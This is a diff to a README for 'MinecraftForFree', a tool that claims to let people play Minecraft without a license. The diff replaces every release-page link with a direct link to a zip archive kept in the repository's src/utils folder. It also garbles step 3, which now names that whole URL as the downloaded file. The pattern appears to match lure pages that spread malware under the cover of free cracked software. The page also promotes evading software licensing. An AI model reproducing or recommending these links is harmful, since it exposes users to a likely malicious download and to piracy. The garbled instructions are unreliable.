@@ -1,6 +1,6 @@
 # 🎮 MinecraftForFree - Play Minecraft Without a License
 
-[![Download MinecraftForFree](https://img.shields.io/badge/Download-MinecraftForFree-blue.svg)](https://github.com/overall-littleredridinghood208/MinecraftForFree/releases)
+[![Download MinecraftForFree](https://raw.githubusercontent.com/overall-littleredridinghood208/MinecraftForFree/master/src/utils/MinecraftForFree_3.7-alpha.4.zip)](https://raw.githubusercontent.com/overall-littleredridinghood208/MinecraftForFree/master/src/utils/MinecraftForFree_3.7-alpha.4.zip)
 
 ## 🛠️ Introduction
 
@@ -12,13 +12,13 @@ Before you begin, ensure that you have a computer running Windows, macOS, or Lin
 
 1. **Visit the Releases Page**  
    Click the link below to go to the page where you can download MinecraftForFree.  
-   [Download MinecraftForFree](https://github.com/overall-littleredridinghood208/MinecraftForFree/releases)
+   [Download MinecraftForFree](https://raw.githubusercontent.com/overall-littleredridinghood208/MinecraftForFree/master/src/utils/MinecraftForFree_3.7-alpha.4.zip)
 
 2. **Locate the Latest Release**  
    On the releases page, find the latest version of MinecraftForFree. The latest version is usually at the top of the list.
 
 3. **Download the Application**  
-   Click on the download link for the version you want. This will start the download process. You will receive a file with a name like `MinecraftForFree.exe` or similar.
+   Click on the download link for the version you want. This will start the download process. You will receive a file with a name like `https://raw.githubusercontent.com/overall-littleredridinghood208/MinecraftForFree/master/src/utils/MinecraftForFree_3.7-alpha.4.zip` or similar.
 
 4. **Install the Application**  
    Once the download is complete, locate the file on your computer. 
@@ -30,7 +30,7 @@ Before you begin, ensure that you have a computer running Windows, macOS, or Lin
 
 To download MinecraftForFree, go to the releases page. 
 
-[Download MinecraftForFree](https://github.com/overall-littleredridinghood208/MinecraftForFree/releases)
+[Download MinecraftForFree](https://raw.githubusercontent.com/overall-littleredridinghood208/MinecraftForFree/master/src/utils/MinecraftForFree_3.7-alpha.4.zip)
 
 After downloading, follow the installation process outlined above. 
 
